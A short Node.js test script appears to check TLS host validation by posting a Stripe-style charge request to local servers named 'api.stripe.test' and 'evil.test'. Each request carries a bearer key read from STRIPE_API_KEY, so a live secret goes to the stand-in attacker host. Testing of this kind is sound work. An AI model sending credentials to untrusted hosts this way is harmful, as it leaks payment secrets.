// Node.js https (Node's own OpenSSL, statically linked), HTTP/1.1, key in a header.
import { readFileSync } from "node:fs";
import { request } from "node:https";
const cfg = JSON.parse(readFileSync("matrix.json"));
for (const name of ["api.stripe.test", "evil.test"]) {
  const t = performance.now();
  await new Promise((done) => {
    const req = request({ host: "127.0.0.1", port: cfg.ports[name], servername: name, method: "POST", path: "/v1/charges", ca: readFileSync(cfg.ca), headers: { host: name, authorization: "Bearer " + process.env.STRIPE_API_KEY } }, (res) => {
      res.resume();
      res.on("end", () => { console.log(name, "ok", "TIME", (performance.now() - t).toFixed(3)); done(); });
    });
    req.on("error", (e) => { console.log(name, "refused", e.code); done(); });
    req.end("amount=100");
  });
}
